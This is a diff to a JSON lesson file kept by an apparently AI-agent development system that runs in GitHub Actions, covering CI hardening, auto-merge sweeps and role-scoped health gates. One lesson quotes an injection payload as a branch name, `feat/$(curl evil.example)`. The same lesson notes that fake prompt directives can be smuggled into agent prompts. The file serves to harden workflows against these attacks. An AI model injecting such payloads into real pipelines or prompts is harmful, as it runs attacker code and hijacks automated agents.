@@ -17,7 +17,10 @@
     "l0": "CRLF Windows CI flakes: fix at the git layer with .gitattributes, not per-test normalization.",
     "l1": "Without .gitattributes, Windows Git can check out text files with CRLF, breaking regex anchors like /^---\\n/ in fixture-reading tests. Patching each test to strip \\r is a bandage — the inconsistency keeps producing new failures.",
     "value": "Add `* text=auto eol=lf` + binary pins (*.png *.jpg *.ico) to .gitattributes, then run `git add --renormalize .` to normalize existing tracked files with no content change. This removes a whole class of platform-only surprises at the source. Regression: every checkout now sees identical bytes on Linux, macOS, and Windows. Provenance: PR #11 (the Dev-mesh's first Coder-authored change, closing Issue #3).",
-    "provenance": { "source": "PR #11 / Issue #3", "ts": "2026-06-15" }
+    "provenance": {
+      "source": "PR #11 / Issue #3",
+      "ts": "2026-06-15"
+    }
   },
   "curator-actions-pr-bootstrap": {
     "status": "active",
@@ -25,15 +28,22 @@
     "l0": "memory:promote branch lands but no PR until repo Settings enables 'Allow Actions to create PRs'.",
     "l1": "The Curator pushes the branch successfully but `gh pr create` errors with 403. No error is surfaced to the caller — the branch sits orphaned. The session must bridge manually (push branch + open PR via integration token). This is a one-time bootstrap gap, not a recurring issue, but it will bite every new repo that adds the dev-mesh without enabling the setting first.",
     "value": "Before the first Curator invocation in a new repo, enable Settings → Actions → General → 'Allow GitHub Actions to create and approve pull requests'. Without it, memory:promote is silently half-complete: branch exists, PR does not. To detect: check for branches named memory/* with no open PR. After enabling, future Curator runs open their own PRs with no manual step. Provenance: PR #13 (first memory:promote PR to merge; was bridged because this setting was off when PR #11 merged).",
-    "provenance": { "source": "PR #13", "ts": "2026-06-15" }
+    "provenance": {
+      "source": "PR #13",
+      "ts": "2026-06-15"
+    }
   },
   "honesty-gate-blocked-advisory": {
-    "status": "active",
-    "valid_to": null,
-    "l0": "ask-role `blocked` (≥5 denials) → advisory gate (exit 0, ::warning::); do-mode `blocked` stays fatal.",
-    "l1": "The ask-role Reviewer is granted only `Read,Grep,Glob,Bash(gh:*)`. During a review it naturally tries `ls`/`cat`/`git diff` — these pile past the 5-denial threshold and produce `blocked`. Before PR #25, `assert-run-healthy.mjs` treated `blocked` as fatal (exit 1), making every PR's advisory `review` check red even though the review ran and posted real comments. The pure classifier in `src/dev-mesh/health.js` correctly keeps `blocked` as unhealthy for aggregate scoring — only the gate's job-result mapping needed to change.",
-    "value": "In `assert-run-healthy.mjs` (and any honesty gate downstream), use this exit policy: `healthy` → 0; `blocked` → emit `::warning::` + exit 0; `errored`/`noop`/`unknown`/missing-file → exit 1. Keep the pure classifier unchanged — it still counts `blocked` as unhealthy for scheduled health scoring. This split lets advisory workflows show yellow without turning the merge-blocking gate red. Provenance: PR #25 (2026-06-15).",
-    "provenance": { "source": "PR #25: fix(dev-mesh): make honesty gate's 'blocked' status advisory, not fatal", "ts": "2026-06-15" }
+    "status": "superseded",
+    "valid_to": "2026-06-15",
+    "superseded_by": "honesty-gate-role-scoped",
+    "l0": "SUPERSEDED by PR #26 — the all-roles advisory default was too broad. See honesty-gate-role-scoped.",
+    "l1": "PR #25 made `blocked` globally advisory (exit 0). PR #26 reverted this: `blocked` is fatal again by default for do-workers; only light/ask roles get `--advisory-blocked` explicitly. The lesson was directionally correct about ask-roles but incorrectly extended the advisory behavior to do-workers, which need the strict default to catch real tool-grant misconfigurations.",
+    "value": "Retired 2026-06-15. Use honesty-gate-role-scoped instead.",
+    "provenance": {
+      "source": "PR #25 (superseded by PR #26)",
+      "ts": "2026-06-15"
+    }
   },
   "yaml-flag-drift-structural-lint": {
     "status": "active",
@@ -41,7 +51,10 @@
     "l0": "Encode YAML flag conventions as structural lints — misconfig must fail CI, not silently corrupt health signal.",
     "l1": "PR #28 hardened `--advisory-blocked`: the ask/do boundary lived only in per-workflow YAML. A do-mode pusher wrongly given `--advisory-blocked` would lose its honest RED without any CI failure. Fix: a lint in `test/dev-mesh-assert-run-healthy.test.js` crosschecks the flag against `Bash(git:*)` (do-mode-pusher proxy) for every workflow calling `assert-run-healthy.mjs`. Tracks exact count (10) — adding/removing a workflow forces a deliberate update.",
     "value": "When a behavioral flag (e.g. `--advisory-blocked`) follows a rule derivable from a YAML property (e.g. whether the role grants `Bash(git:*)`), encode that rule as a hermetic structural lint: (1) iterate all target workflow files; (2) detect the boundary via a proxy heuristic (`isPusher = /Bash\\(git:\\*\\)/.test(wf)`); (3) assert the flag matches (`hasFlag = /script\\.mjs[^\\n]*--advisory-blocked/.test(wf)`); (4) assert `isPusher ↔ !hasFlag`; (5) guard an exact workflow count so adding/removing a file forces a deliberate update. Run in the standard hermetic test suite so it gates every PR. Document the proxy heuristic's scope (e.g. `Bash(git:*)` only — a broader `Bash` or narrower `Bash(git:push)` would need the pattern updated). Provenance: PR #28 (2026-06-15).",
-    "provenance": { "source": "PR #28: test(dev-mesh): lint the advisory-blocked convention against tool grants", "ts": "2026-06-15" }
+    "provenance": {
+      "source": "PR #28: test(dev-mesh): lint the advisory-blocked convention against tool grants",
+      "ts": "2026-06-15"
+    }
   },
   "automerge-validate-merge-not-head": {
     "status": "active",
@@ -49,6 +62,109 @@
     "l0": "Automerge: validate MERGE RESULT not stale branch HEAD — stale-but-clean PRs self-heal; HEAD-validation stalls forever.",
     "l1": "Two bugs in memory auto-merge fixed by PR #42: (1) sweep validated branch HEAD's quick.json — PRs branched before an l0 trim fix carried the old invalid file yet merged cleanly; HEAD-invalid → refused; mergefix only touches DIRTY PRs → permanent stall. Fix: `git merge origin/main` first, validate the merged tree. (2) guard only matched `quick.json`, blocking memory `*.md` workflow docs from ever auto-merging. Fix: allow `quick.json` OR `([^/]+/)?[^/]+\\.md` under `dev-mesh/<role>/memory/`, anchored so `.js` etc. still require human review.",
     "value": "For any auto-merge sweep that validates a file before merging: always simulate the merge first (`git fetch origin main && git merge origin/main --no-edit`) and validate the resulting tree — NOT the branch HEAD. A stale-but-clean branch that would validate after merge is permanently stuck if you validate the HEAD (nothing triggers a refresh since mergefix only touches conflict-DIRTY branches). Also: define the guard regex precisely enough to cover all legitimate file types in the merge target. For the memory auto-merge, `quick.json` alone was too narrow — Curator-authored `workflows/*.md` pattern docs are also inert memory data and must be accepted. Use an anchored ERE that admits subdir depth explicitly (`([^/]+/)?[^/]+\\.md`) rather than `.*\\.md`, so executable files at arbitrary nesting depth cannot slip through. Provenance: PR #42 (2026-06-15), fixing stale-clean-branch deadlock + guard scope gap.",
-    "provenance": { "source": "PR #42: fix(dev-mesh): memory-automerge self-heals stale-clean PRs + accepts memory *.md", "ts": "2026-06-15" }
+    "provenance": {
+      "source": "PR #42: fix(dev-mesh): memory-automerge self-heals stale-clean PRs + accepts memory *.md",
+      "ts": "2026-06-15"
+    }
+  },
+  "timing-race-two-phase-budget": {
+    "status": "active",
+    "valid_to": null,
+    "l0": "Flaky timing tests with two phases (setup → trigger): poll instead of fixed sleep, and use two named constants…",
+    "l1": "When a test confirms 'state is ready' before an event fires (e.g. wait for pid file, then kill), a formula like `KILL_TIMEOUT_MS - 1000` hides the dependency: changing either constant silently breaks the other, and the gap collapses on loaded CI runners. process.test.js ('spawnFile timeout kills the whole process tree') flaked on windows-latest/node-20 (Issue #9) because the grandchild hadn't written its pid file within the 1s pre-kill window — the tree was killed before the assertion could pass.",
+    "value": "Pattern: (1) poll for the setup condition (pid file, port, lock, etc.) bounded by STARTUP_BUDGET_MS; (2) define KILL_TIMEOUT_MS = STARTUP_BUDGET_MS + N (2s recommended slack) so the ordering constraint is encoded in the constant definition, not implicit math. A generous startup budget (5000ms) covers two cold Node starts on a loaded Windows runner. Apply this shape to any test that must confirm 'state ready' before 'event fires'. Provenance: PR #35 / Issue #9 (2026-06-15).",
+    "provenance": {
+      "source": "PR #35 / Issue #9",
+      "ts": "2026-06-15"
+    }
+  },
+  "gh-actions-ref-injection": {
+    "status": "active",
+    "valid_to": null,
+    "l0": "Never interpolate attacker-controlled GitHub context (e.g. `${{ github.event.pull_request.head.ref }}`) inside `run:`…",
+    "l1": "A collaborator can craft a branch name like `feat/$(curl evil.example)` or embed fake prompt directives. When `${{ head.ref }}` appears directly in a `run:` step or a prompt string it is template-interpolated before the shell sees it, executing the payload. Discovered in the dev-mesh autofix/mergefix workflows before PR #22 hardened them.",
+    "value": "Structural fix: (1) add `env: PR_BRANCH: ${{ github.event.pull_request.head.ref }}` to each step that needs the ref; (2) use `$PR_BRANCH` (or `$HEAD_REF`) in `run:` and prompt blocks — never the raw `${{ ... head.ref ... }}`; (3) lint-assert that no bare context interpolation of attacker-controlled refs appears in `run:`/prompt blocks. Only integers (PR number) and `env:`/`if:` expressions remain safe for direct interpolation. Provenance: PR #22 (2026-06-15).",
+    "provenance": {
+      "source": "PR #22: fix(dev-mesh): structural injection hardening for autofix + mergefix (branch ref via env)",
+      "ts": "2026-06-15"
+    }
+  },
+  "actions-recursion-guard-schedule": {
+    "status": "active",
+    "valid_to": null,
+    "l0": "Actions recursion guard: GITHUB_TOKEN PRs never trigger pull_request events — use a cron schedule to auto-merge them.",
+    "l1": "When a workflow creates a PR using GITHUB_TOKEN, GitHub's recursion guard blocks all pull_request events on that PR — so a 'merge when checks pass on pull_request: [opened]' trigger never fires. Solution: a scheduled workflow (e.g., every 15 min on cron) that polls for open PRs matching a label+same-repo filter, runs a light validator, and squash-merges. No PAT and no extra repo setting needed beyond merge capability. Structural guards (restrict changed paths) must run inside the scheduled job, not as branch protection, since the PR's check suite may be empty.",
+    "value": "Pattern for auto-merging GITHUB_TOKEN-opened PRs in GitHub Actions:\n1. Label the bot PR at creation (e.g., 'memory:promote').\n2. Create a scheduled workflow (cron: '*/15 * * * *') — NOT a pull_request trigger.\n3. In the job: query open PRs with the label + same-repo filter (gh pr list --label memory:promote --json number,headRefName,isCrossRepository).\n4. Structural guard: verify every changed file is under the expected safe directory (e.g., dev-mesh/*/memory/) — reject any that touch code.\n5. Light validation: run a domain-specific validator (not the full test suite — heavy CI would be overkill and delay merges).\n6. Squash-merge on pass.\nMatching bookend in ci.yml: add paths-ignore for the safe directory so memory-only PRs skip the heavy matrix (unprotected main means no stranded required check). Applied in dev-mesh-memory-automerge.yml. Provenance: PR #21 (2026-06-15).",
+    "provenance": {
+      "source": "PR #21: feat(dev-mesh): fully automate memory:promote (light check + auto-merge, skip heavy CI)",
+      "ts": "2026-06-15"
+    }
+  },
+  "github-recursion-guard-poll": {
+    "status": "active",
+    "valid_to": null,
+    "l0": "GitHub blocks pull_request_review re-triggers from GITHUB_TOKEN → use a cron poll, not an event, to close the…",
+    "l1": "When a workflow posts a review via GITHUB_TOKEN, GitHub's recursion guard prevents that same review from firing the pull_request_review event for another run. An event-driven review-responder would never see its own peers' reviews. The only robust trigger is a scheduled poller (e.g. every 30 min) that queries for PRs in CHANGES_REQUESTED state.",
+    "value": "Wire review-respond as a scheduled job (cron), not a pull_request_review event listener. Have the Coder read review threads via `gh pr view --json reviews` as untrusted DATA, fix actionable points with minimal edits, commit [review-fix], push — never self-merge. Cap [review-fix] commits per branch (≤2) to bound runaway loops. Completes the self-sustaining mesh loop: idea → build → review → (CHANGES_REQUESTED) → auto-fix → … → human merge. Provenance: PR #23 (2026-06-15).",
+    "provenance": {
+      "source": "PR #23: feat(dev-mesh): review-respond — autonomously read & act on review feedback (scheduled)",
+      "ts": "2026-06-15"
+    }
+  },
+  "honesty-gate-role-scoped": {
+    "status": "active",
+    "valid_to": null,
+    "l0": "Shared gate scripts serving mixed-permission roles need per-caller opt-in flags: `blocked` is fatal for do-workers…",
+    "l1": "PR #25 made `blocked` (≥5 denials) globally advisory — too broad. For do-workers (autofix, mergefix, backlog, curate) granted `Edit,Write,Bash(git:*)`, ≥5 denials almost always signals a real misconfigured tool grant (e.g. `Bash(git)` vs `Bash(git:*)` — the exact bug the gate exists to catch). PR #26 reverted the global default and added `--advisory-blocked`: a flag that downgrades `blocked` to warning+exit-0, passed ONLY from light/ask callers (review, triage, intake, research) where probe-denials are expected noise. The pure classifier in `src/dev-mesh/health.js` is unchanged — it still…",
+    "value": "When writing a gate script shared by both do-workers and ask-workers: (1) keep `blocked` → exit 1 as the strict default; (2) add an explicit opt-in flag (`--advisory-blocked`) that downgrades to `::warning::` + exit 0; (3) pass the flag ONLY from ask/light-role callers where denials are expected (review, triage, intake, research); (4) do-workers (autofix, mergefix, backlog, curate) pass nothing and stay strict. Never make advisory the global default — do-workers need the gate red when their tool grants are broken. Provenance: PR #26 (2026-06-15), supersedes honesty-gate-blocked-advisory.",
+    "provenance": {
+      "source": "PR #26: fix(dev-mesh): scope honesty gate's blocked-advisory to light roles only",
+      "ts": "2026-06-15"
+    }
+  },
+  "event-driven-polling-backstop": {
+    "status": "active",
+    "valid_to": null,
+    "l0": "Event-driven CI automation must be paired with a scheduled polling backstop — GitHub webhook delivery is not guaranteed.",
+    "l1": "`dev-mesh-autofix.yml` fires on `check_run` events but a missed/undelivered webhook leaves a red PR untouched. PR #24 added `dev-mesh-ci-sweep.yml` (every 30 min) as the polling backstop. Both share a per-branch `[autofix]` budget cap (≤ 2 commits, counted via `git log --grep`) so they can't double-spend on the same branch. Offset cron (`25,55 * * * *`) avoids thundering-herd with the other sweeps.",
+    "value": "Whenever you wire a `check_run`/`pull_request`/`push` event-driven workflow, add a scheduled twin at ≤30-min intervals. Let them share a named commit-message marker as the budget token (e.g., `[autofix]`) and grep `base..HEAD` to count spend. Use offset cron minutes so concurrency groups don't all wake at :00. Branch name must flow through `env:` (never shell-interpolated) — injection-safe. Provenance: PR #24 (2026-06-15).",
+    "provenance": {
+      "source": "PR #24: feat(dev-mesh): ci-sweep — scheduled reader for failing-CI PRs (backstop to autofix)",
+      "ts": "2026-06-15"
+    }
+  },
+  "fix-then-lint-pattern": {
+    "status": "active",
+    "valid_to": null,
+    "l0": "Gate policy runtime fix is step 1 of 2 — always open a lint/test follow-up to statically enforce the new convention…",
+    "l1": "PR #25 changed `blocked` from fatal→advisory in the honesty gate and updated docs/quick.json. But without a static check, a future edit to assert-run-healthy.mjs can silently revert the exit-code semantics. PR #28 was opened as the lint follow-up: verify ask-role agents' blocked exit policy matches their declared tool grants. The runtime fix without the lint step is incomplete.",
+    "value": "Two-step pattern: (1) fix runtime gate behavior + document in quick.json; (2) immediately open a follow-up ticket/PR to add a lint rule or test that encodes the new exit-code semantics statically. Apply whenever any gate's status→exit-code mapping changes. Provenance: PR #25 (runtime fix) + PR #27 (lesson promoted) + PR #28 (lint follow-up), 2026-06-15.",
+    "provenance": {
+      "source": "PR #27: memory — distill PR #25 honesty-gate blocked-advisory lesson",
+      "ts": "2026-06-15"
+    }
+  },
+  "actions-pr-open-repo-setting": {
+    "status": "active",
+    "valid_to": null,
+    "l0": "gh pr create from Actions needs both `pull-requests: write` YAML permission AND the repo-level 'Allow GitHub Actions…",
+    "l1": "The YAML `permissions: pull-requests: write` is necessary but not sufficient. The GitHub repository setting (Settings → Actions → General → 'Allow GitHub Actions to create and approve pull requests') must also be ON. Without it, a workflow can push branches but `gh pr create` silently fails — the PR is never opened. The first memory:promote PR (#12) was manually bridged by a human session because this setting was missing at initial dev-mesh deployment.",
+    "value": "When deploying a new dev-mesh instance (or any Actions workflow that opens PRs), verify the repo setting before the first run. Symptom of missing setting: branch exists in remote, but no PR appears. Fix: Settings → Actions → General → enable 'Allow GitHub Actions to create and approve pull requests'. The dev-mesh-curate.yml workflow already carries the correct YAML permissions — the repo toggle is the only remaining gate.",
+    "provenance": {
+      "source": "PR #12 (2026-06-15) — first memory:promote, manually bridged because repo setting was off",
+      "ts": "2026-06-15"
+    }
+  },
+  "multi-bot-shared-file-conflicts": {
+    "status": "active",
+    "valid_to": null,
+    "core": true,
+    "l0": "Multiple bots writing memory PRs simultaneously → merge conflicts on shared files (e.g. quick.json) — fix once with an…",
+    "l1": "PR #12 was blocked when two memory PRs both touched quick.json at the same time. The systemic fix (PR #16) is dev-mesh-mergefix.yml: on every main update, detect DIRTY same-repo PRs → merge main → auto-resolve (quick.json: union both sides' keys; code: minimal combined result; unresolvable: abort + comment) → commit [mergefix] → push. Safety: ≤2 [mergefix] commits per branch (branch-only count, excluding merged history), no force-push, no auto-merge, same-repo only. GITHUB_TOKEN pushes don't re-trigger the workflow so there is no loop.",
+    "value": "When the dev-mesh gains new agents that write to shared memory files, conflicts are expected and self-heal via mergefix without manual intervention. For quick.json, key-union resolution ensures no lesson is silently dropped. The human merge gate is preserved. Track the [mergefix] commit count per branch (≤2) as the bounded-safety invariant.",
+    "provenance": {
+      "source": "PR #16: feat(dev-mesh): mergefix — auto-resolve PRs that conflict with main",
+      "ts": "2026-06-15"
+    }
   }
 }
